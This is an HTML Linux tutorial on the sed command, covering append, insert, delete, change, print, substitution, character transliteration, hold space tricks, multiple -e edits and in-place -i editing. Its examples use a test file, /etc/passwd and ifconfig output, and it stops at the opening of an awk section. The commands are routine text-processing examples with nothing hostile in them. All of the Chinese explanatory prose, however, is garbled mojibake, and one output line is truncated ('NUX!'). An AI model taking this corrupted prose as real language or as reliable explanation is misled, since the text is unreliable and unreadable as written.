<p>sedæ”¯æŒä¸€èˆ¬çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸‹é¢æ˜¯æ”¯æŒçš„æ­£åˆ™è¯­æ³•ï¼š<code>^</code>è¡Œçš„å¼€å§‹ å¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚<code>$</code>è¡Œçš„ç»“æŸ å¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚<code>.</code>åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ å¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œç„¶åæ˜¯dã€‚<code>*</code>åŒ¹é…é›¶æˆ–å¤šä¸ªå­—ç¬¦ å¦‚ï¼š/*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼åç´§è·Ÿsedçš„è¡Œã€‚<code>[]</code>åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚<code>/[Ss]ed/</code>åŒ¹é…sedå’ŒSedã€‚<code>[^]</code>åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š<code>/[^A-RT-Z]ed/</code>åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚<code>\(..\)</code>ä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/(love)able/\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚<code>&amp;</code>ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚<code>s/love/**&amp;**/</code>ï¼Œloveè¿™æˆ<code>**love**</code>ã€‚<code>\&lt;</code>å•è¯çš„å¼€å§‹ï¼Œå¦‚:/&lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚<code>\&gt;</code>å•è¯çš„ç»“æŸï¼Œå¦‚/love&gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚<code>x\+</code>é‡å¤å­—ç¬¦xï¼Œè‡³å°‘1æ¬¡ï¼Œå¦‚ï¼š<code>/o\+/</code>åŒ¹é…è‡³å°‘æœ‰1ä¸ªoçš„è¡Œã€‚<code>x\&#123;m\&#125;</code>é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š<code>/o\&#123;5\&#125;/</code>åŒ¹é…åŒ…å«5ä¸ªoçš„è¡Œã€‚<code>x\&#123;m,\&#125;</code>é‡å¤å­—ç¬¦x,è‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š<code>/o\&#123;5,\&#125;/</code>åŒ¹é…è‡³å°‘æœ‰5ä¸ªoçš„è¡Œã€‚<code>x\&#123;m,n\&#125;</code>é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š<code>/o\&#123;5,10\&#125;/</code>åŒ¹é…5-10ä¸ªoçš„è¡Œã€‚</p>
<h4 id="a-i-åœ¨æŒ‡å®šè¡Œä½ç½®æ·»åŠ è¡Œ">a|i:åœ¨æŒ‡å®šè¡Œä½ç½®æ·»åŠ è¡Œ</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line">[root@rocky8:Corazon]# sed -e 2a\newline a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>é»˜è®¤æƒ…å†µä¸‹<code>-e</code>å‚æ•°å¯ä»¥çœç•¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# <span class="built_in">cat</span> a | sed <span class="string">&#x27;2a\newline&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line">[root@rocky8:~]# sed 2a\newline a</span><br><span class="line">NUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2a newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line">newline</span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>åœ¨ç¬¬äºŒè¡Œä¹‹å‰æ·»åŠ ä¸€è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;2i newline&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line">newline</span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>æœ€åä¸€è¡ŒåŠ å…¥ <code># This is a test</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# sed <span class="string">&#x27;$a # This is a test&#x27;</span> a</span><br><span class="line">LINUX!  </span><br><span class="line"> Linux is a free unix-type opterating system.  </span><br><span class="line"> This is a linux testfile!  </span><br><span class="line"> Linux <span class="built_in">test</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a test</span></span><br></pre></td></tr></table></figure>
<p>åŒæ—¶æ·»åŠ å¤šè¡Œï¼š</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[root@rocky8:Corazon]# cat a|sed <span class="string">&#x27;2a\newline1\</span></span><br><span class="line"><span class="string">&gt; newline2&#x27;</span></span><br><span class="line">LINUX!  </span><br><span class="line"> Linux <span class="keyword">is</span> a free unix-<span class="keyword">type</span> opterating <span class="keyword">system</span>.  </span><br><span class="line">newline1</span><br><span class="line">newline2</span><br><span class="line"> This <span class="keyword">is</span> a linux testfile!  </span><br><span class="line"> Linux test</span><br></pre></td></tr></table></figure>
<h4 id="d-åˆ é™¤æŒ‡å®šè¡Œ">d:åˆ é™¤æŒ‡å®šè¡Œ</h4>
<p>å°† /etc/passwd çš„å†…å®¹åˆ—å‡ºè¡Œå·ï¼Œå¹¶å°†ç¬¬ 2~5 è¡Œåˆ é™¤ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">.....(åé¢çœç•¥).....</span><br></pre></td></tr></table></figure>
<p>åªåˆ é™¤ç¬¬2è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;2d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>åˆ é™¤ç¬¬3åˆ°æœ€åä¸€è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nl</span> /etc/passwd | sed <span class="string">&#x27;3,$d&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>åˆ é™¤/etc/passwdæ‰€æœ‰åŒ…å«<code>/sbin/nologin</code>çš„è¡Œï¼Œå…¶ä»–è¡Œè¾“å‡ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;/\/sbin\/nologin/d&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">    25	zah:x:1000:1000:Zah:/home/zah:/bin/bash</span><br><span class="line">    26	Cora:x:1002:1002::/home/Cora:/bin/bash</span><br><span class="line">    27	Corazon:x:1003:1003::/home/Corazon:/bin/bash</span><br></pre></td></tr></table></figure>
<h4 id="c-æ›¿æ¢æŒ‡å®šè¡Œ">c:æ›¿æ¢æŒ‡å®šè¡Œ</h4>
<p>å°†ç¬¬2-5è¡Œçš„å†…å®¹æ›¿æ¢æˆä¸ºã€No 2-5 numberã€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;2,5c No 2-5 number&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/bash</span><br><span class="line">No 2-5 number</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br></pre></td></tr></table></figure>
<h4 id="p-ä»…æ˜¾ç¤ºæŒ‡å®šè¡Œ">p:ä»…æ˜¾ç¤ºæŒ‡å®šè¡Œ</h4>
<p>ä¸åŠ <code>-n</code>é€‰é¡¹æ—¶ï¼Œé™¤äº†è¾“å‡ºåŒ¹é…è¡Œï¼Œè¿˜åŒæ—¶ä¼šè¾“å‡ºæ‰€æœ‰è¡Œï¼Œæ‰€ä»¥éœ€è¦åŠ <code>-n</code>é€‰é¡¹ã€‚</p>
<p>ä»…åˆ—å‡º /etc/passwd æ–‡ä»¶å†…çš„ç¬¬ 5-7 è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed -n <span class="string">&#x27;5,7p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br></pre></td></tr></table></figure>
<p>æœç´¢ /etc/passwdæœ‰rootå…³é”®å­—çš„è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd|sed -n <span class="string">&#x27;/root/p&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/root/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>æ‰“å°/etc/passwdæœ‰ä»¥rootå’Œbinå¼€å¤´ä¹‹é—´çš„è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# sed -n <span class="string">&#x27;/^root/,/^bin/p&#x27;</span> /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>æ‰“å°ä»ç¬¬äº”è¡Œå¼€å§‹åˆ°ç¬¬ä¸€ä¸ªåŒ…å«ä»¥<code>/usr/games</code>å¼€å§‹çš„è¡Œä¹‹é—´çš„æ‰€æœ‰è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -n <span class="string">&#x27;5,\/usr\/games/p&#x27;</span></span><br><span class="line">     5	lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">     6	<span class="built_in">sync</span>:x:5:0:<span class="built_in">sync</span>:/sbin:/bin/sync</span><br><span class="line">     7	shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">     8	halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">     9	mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">    10	operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">    11	games:x:12:100:games:/usr/games:/sbin/nologin</span><br></pre></td></tr></table></figure>
<h4 id="s-å­—ç¬¦ä¸²æ›¿æ¢">s:å­—ç¬¦ä¸²æ›¿æ¢</h4>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sed</span> <span class="string">&#x27;s/è¦è¢«å–ä»£çš„å­—ä¸²/æ–°çš„å­—ä¸²/g&#x27;</span></span><br></pre></td></tr></table></figure>
<p>ä¸è®ºä»€ä¹ˆå­—ç¬¦ï¼Œç´§è·Ÿç€så‘½ä»¤çš„éƒ½è¢«è®¤ä¸ºæ˜¯æ–°çš„åˆ†éš”ç¬¦.</p>
<p><code>sed 's#10#100#g'</code>è¡¨ç¤ºæŠŠæ‰€æœ‰10æ›¿æ¢æˆ100ï¼Œâ€œ#â€åœ¨è¿™é‡Œæ˜¯åˆ†éš”ç¬¦ï¼Œä»£æ›¿äº†é»˜è®¤çš„â€œ/â€åˆ†éš”ç¬¦ã€‚</p>
<p>æå–æœ¬æœºæ‰€æœ‰çš„ipåœ°å€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span></span><br><span class="line">        inet 10.0.0.191  netmask 255.255.255.0  broadcast 10.0.0.255</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">[root@rocky8:~]# ifconfig | grep <span class="string">&#x27;inet &#x27;</span>|sed <span class="string">&#x27;s/^[^0-9]*\([0-9\.]*\).*$/\1/g&#x27;</span></span><br><span class="line">10.0.0.191</span><br><span class="line">127.0.0.1</span><br></pre></td></tr></table></figure>
<p>å¯¹äºä»¥rootå’Œbinå¼€å¤´ä¹‹é—´çš„è¡Œï¼Œæ¯è¡Œçš„æœ«å°¾æ·»åŠ sed testï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> /etc/passwd | sed <span class="string">&#x27;/^root/,/^bin/s/$/--sed test/&#x27;</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash--sed <span class="built_in">test</span></span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin--sed <span class="built_in">test</span></span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h4 id="y-å•å­—ç¬¦æ›¿æ¢">y:å•å­—ç¬¦æ›¿æ¢</h4>
<p>è·Ÿsä¸€æ ·ä¹Ÿç”¨äºæ›¿æ¢ï¼Œä¸è¿‡sæ›¿æ¢çš„æ˜¯æ•´ä½“ï¼Œyæ›¿æ¢çš„æ˜¯æ¯ä¸€å­—æ¯å¯¹åº”çš„å•ä¸ªå­—æ¯</p>
<p>æŠŠdataä¸­çš„ç¬¬ä¸€è¡Œè‡³ç¬¬ä¸‰è¡Œä¸­çš„aæ›¿æ¢æˆAï¼Œbæ›¿æ¢æˆBï¼Œcæ›¿æ¢æˆCï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed <span class="string">&#x27;1,3y/abc/ABC/&#x27;</span> data </span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> | sed <span class="string">&#x27;y/13/34/&#x27;</span></span><br><span class="line">324</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;axxbxxcxx&quot;</span> | sed <span class="string">&#x27;y/abc/123/&#x27;</span></span><br><span class="line">1xx2xx3xx</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨ï¼šå•ä¸ªå­—ç¬¦è½¬æ¢ç”¨yï¼Œå­—ç¬¦ä¸²è½¬æ¢ç”¨<code>'s/str1/str2/g'</code></font></p>
<h4 id="hHgGæ¨¡å¼ç©ºé—´ä¸ä¿æŒç©ºé—´"><code>hHgG</code>æ¨¡å¼ç©ºé—´ä¸ä¿æŒç©ºé—´</h4>
<p>é¦–å…ˆä»‹ç»ä¸€ä¸‹æ¨¡å¼ç©ºé—´å’Œä¿æŒç©ºé—´:</p>
<blockquote>
<p><strong>ï¼ˆHã€hã€Gã€gã€xï¼‰</strong><br>
<strong>æ¨¡å¼ç©ºé—´ï¼š</strong><a href="https://so.csdn.net/so/search?q=sed&amp;spm=1001.2101.3001.7020">sed</a>å¤„ç†æ–‡æœ¬å†…å®¹è¡Œçš„ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºï¼Œæ¨¡å¼ç©ºé—´ä¸­çš„å†…å®¹ä¼šä¸»åŠ¨æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œå¹¶è‡ªåŠ¨æ¸…ç©ºæ¨¡å¼ç©ºé—´</p>
<p>**ä¿æŒç©ºé—´ï¼š**sedå¤„ç†æ–‡æœ¬å†…å®¹è¡Œçš„å¦ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºï¼Œä¸åŒçš„æ˜¯ä¿æŒç©ºé—´å†…å®¹ä¸ä¼šä¸»åŠ¨æ¸…ç©ºï¼Œä¹Ÿä¸ä¼šä¸»åŠ¨æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºï¼Œè€Œæ˜¯éœ€è¦<a href="https://so.csdn.net/so/search?q=sed%E5%91%BD%E4%BB%A4&amp;spm=1001.2101.3001.7020">sedå‘½ä»¤</a>æ¥è¿›è¡Œå¤„ç†</p>
</blockquote>
<p>æ¨¡å¼ç©ºé—´ä¸ä¿æŒç©ºé—´çš„å…³ç³»:</p>
<blockquote>
<p>**æ¨¡å¼ç©ºé—´ï¼š**ç›¸å½“äºæµæ°´çº¿ï¼Œæ–‡æœ¬è¡Œå†æ¨¡å¼ç©ºé—´ä¸­è¿›è¡Œå¤„ç†ï¼›<br>
**ä¿æŒç©ºé—´ï¼š**ç›¸å½“äºä»“åº“ï¼Œåœ¨æ¨¡å¼ç©ºé—´å¯¹æ•°æ®è¿›è¡Œå¤„ç†æ—¶ï¼Œå¯ä»¥æŠŠæ•°æ®ä¸´æ—¶å­˜å‚¨åˆ°ä¿æŒç©ºé—´ï¼›ä½œä¸ºæ¨¡å¼ç©ºé—´çš„ä¸€ä¸ªè¾…åŠ©ä¸´æ—¶ç¼“å†²åŒºï¼Œä½†åˆæ˜¯ç›¸äº’ç‹¬ç«‹ï¼Œå¯ä»¥è¿›è¡Œäº¤äº’ï¼Œå‘½ä»¤å¯ä»¥å¯»å€æ¨¡å¼ç©ºé—´ä½†æ˜¯ä¸èƒ½å¯»å€ä¿æŒç©ºé—´ã€‚å¯ä»¥ä½¿ç”¨é«˜çº§å‘½ä»¤h,H,g,Gä¸æ¨¡å¼ç©ºé—´è¿›è¡Œäº¤äº’ã€‚</p>
</blockquote>
<p>å®é™…ä¸Šï¼Œ ä¿æŒç©ºé—´æ˜¯æ¨¡å¼ç©ºé—´ä¸€ä¸ªä¸´æ—¶å­˜æ”¾æ•°æ®çš„ç¼“å†²åŒºï¼ŒååŠ©æ¨¡å¼ç©ºé—´è¿›è¡Œæ•°æ®å¤„ç†ã€‚</p>
<p>ç›¸å…³å‘½ä»¤çš„ä½œç”¨ï¼š</p>
<blockquote>
<p><strong>d</strong>     Delete pattern space.  Start next cycle.<br>
åˆ é™¤pattern spaceçš„å†…å®¹ï¼Œå¼€å§‹ä¸‹ä¸€ä¸ªå¾ªç¯</p>
<p><strong>h H</strong>   Copy/append pattern space to hold space.<br>
å¤åˆ¶/è¿½åŠ pattern spaceçš„å†…å®¹åˆ°hold space.ï¼ˆå¤åˆ¶ä¼šè¦†ç›–åŸå†…å®¹ï¼‰</p>
<p><strong>g G</strong>   Copy/append hold space to pattern space.<br>
å¤åˆ¶/è¿½åŠ hold spaceçš„å†…å®¹åˆ°pattern space. ï¼ˆå¤åˆ¶ä¼šè¦†ç›–åŸå†…å®¹ï¼‰</p>
<p><strong>x</strong>    Exchange the contents of the  hold  and  pattern spaces.<br>
äº¤æ¢hold spaceå’Œpattern spaceçš„å†…å®¹.</p>
</blockquote>
<p>hå‘½ä»¤æ˜¯å°†å½“å‰æ¨¡å¼ç©ºé—´ä¸­å†…å®¹è¦†ç›–è‡³ä¿æŒç©ºé—´ï¼ŒHå‘½ä»¤æ˜¯å°†å½“å‰æ¨¡å¼ç©ºé—´ä¸­çš„å†…å®¹è¿½åŠ è‡³ä¿æŒç©ºé—´</p>
<p>gå‘½ä»¤æ˜¯å°†å½“å‰ä¿æŒç©ºé—´ä¸­å†…å®¹è¦†ç›–è‡³æ¨¡å¼ç©ºé—´ï¼ŒGå‘½ä»¤æ˜¯å°†å½“å‰ä¿æŒç©ºé—´ä¸­çš„å†…å®¹è¿½åŠ è‡³æ¨¡å¼ç©ºé—´</p>
<p>æ¨¡æ‹Ÿtacå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> num</span><br><span class="line">One</span><br><span class="line">Two</span><br><span class="line">Three</span><br><span class="line">[root@rocky8:~]# <span class="built_in">tac</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;1!G;h;$!d&#x27;</span> num</span><br><span class="line">Three</span><br><span class="line">Two</span><br><span class="line">One</span><br></pre></td></tr></table></figure>
<p>1!Gç¬¬1è¡Œä¸ æ‰§è¡Œâ€œGâ€å‘½ä»¤ï¼Œä»ç¬¬2è¡Œå¼€å§‹æ‰§è¡Œã€‚</p>
<p>$!dï¼Œæœ€åä¸€è¡Œä¸åˆ é™¤ï¼ˆä¿ç•™æœ€å1è¡Œï¼‰ï¼ˆåªæœ‰æœ€åä¸€è¡Œä¸åˆ ï¼‰</p>
<p>åŸç†å›¾ï¼š</p>
<p><img src="/posts/247a4e5f//image-20250219211455837.png" alt="image-20250219211455837"></p>
<p>é€’å¢åºåˆ—ï¼š</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;H;g&#x27;</span></span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">[root<span class="symbol">@rocky8</span>:~]<span class="meta"># seq 3|sed <span class="string">&#x27;1h;1!H;g&#x27;</span></span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h4 id="å¤šæ¬¡æŒ‡å®š-eé€‰é¡¹è¿›è¡Œå¤šç‚¹ç¼–è¾‘">å¤šæ¬¡æŒ‡å®š<code>-e</code>é€‰é¡¹è¿›è¡Œå¤šç‚¹ç¼–è¾‘</h4>
<p>åˆ é™¤/etc/passwdç¬¬ä¸‰è¡Œåˆ°æœ«å°¾çš„æ•°æ®ï¼Œå¹¶æŠŠbashæ›¿æ¢ä¸ºblueshellï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd | sed -e <span class="string">&#x27;3,$d&#x27;</span> -e <span class="string">&#x27;s/bash/blueshell/&#x27;</span></span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br></pre></td></tr></table></figure>
<p>åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ä»¥#å¼€å¤´çš„è¡Œå’Œç©ºè¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> abc</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line"></span><br><span class="line"><span class="comment"># aaa</span></span><br><span class="line"></span><br><span class="line">ddd</span><br><span class="line"></span><br><span class="line"><span class="comment"># sss</span></span><br><span class="line">eeee</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# sed -e <span class="string">&#x27;/^#/d&#x27;</span> -e <span class="string">&#x27;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå¯ä»¥é€šè¿‡<code>;</code>å®ç°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">nl</span> /etc/passwd|sed <span class="string">&#x27;3,$d;s/bash/blueshell/&#x27;</span> </span><br><span class="line">     1	root:x:0:0:root:/root:/bin/blueshell</span><br><span class="line">     2	daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">[root@rocky8:~]# sed <span class="string">&#x27;/^#/d;/^$/d&#x27;</span> abc</span><br><span class="line">b</span><br><span class="line">a</span><br><span class="line">ddd</span><br><span class="line">eeee</span><br></pre></td></tr></table></figure>
<h4 id="é€‰é¡¹-iç›´æ¥ä¿®æ”¹æ–‡ä»¶å†…å®¹">é€‰é¡¹<code>-i</code>ç›´æ¥ä¿®æ”¹æ–‡ä»¶å†…å®¹</h4>
<p>é»˜è®¤æƒ…å†µä¸‹sedå‘½ä»¤ä»…ä»…åªæ˜¯å°†å¤„ç†ç»“æœæ˜¾ç¤ºåœ¨æ§åˆ¶å°ï¼ŒåŠ <code>-i</code>é€‰é¡¹åˆ™ä¼šä¿®æ”¹æ–‡ä»¶å†…å®¹ã€‚</p>
<p>å°† regular_express.txt å†…æ¯ä¸€è¡Œç»“å°¾è‹¥ä¸º . åˆ™æ¢æˆ !</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao.</span><br><span class="line">google.</span><br><span class="line">taobao.</span><br><span class="line">facebook.</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br><span class="line">[root@rocky8:~]# sed -i <span class="string">&#x27;s/\.$/\!/&#x27;</span> re</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao!</span><br><span class="line">google!</span><br><span class="line">taobao!</span><br><span class="line">facebook!</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br></pre></td></tr></table></figure>
<h3 id="awkå‘½ä»¤">awkå‘½ä»¤</h3>
<p>AWKæ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚</p>
<p>ä¹‹æ‰€ä»¥å«AWKæ˜¯å› ä¸ºå…¶å–äº†ä¸‰ä½åˆ›å§‹äºº Alfred Ahoï¼ŒPeter Weinberger, å’Œ Brian Kernighan çš„ Family Name çš„é¦–å­—ç¬¦ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk [é€‰é¡¹å‚æ•°] <span class="string">&#x27;script&#x27;</span> var=value file(s)</span><br><span class="line">æˆ–</span><br><span class="line">awk [é€‰é¡¹å‚æ•°] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure>
<p><strong>é€‰é¡¹å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-F fs or --field-separator fs<br>
æŒ‡å®šè¾“å…¥æ–‡ä»¶æŠ˜åˆ†éš”ç¬¦ï¼Œfsæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¦‚-F:ã€‚</p>
</li>
<li class="lvl-2">
<p>-v var=value or --asign var=value<br>
èµ‹å€¼ä¸€ä¸ªç”¨æˆ·å®šä¹‰å˜é‡ã€‚</p>
</li>
<li class="lvl-2">
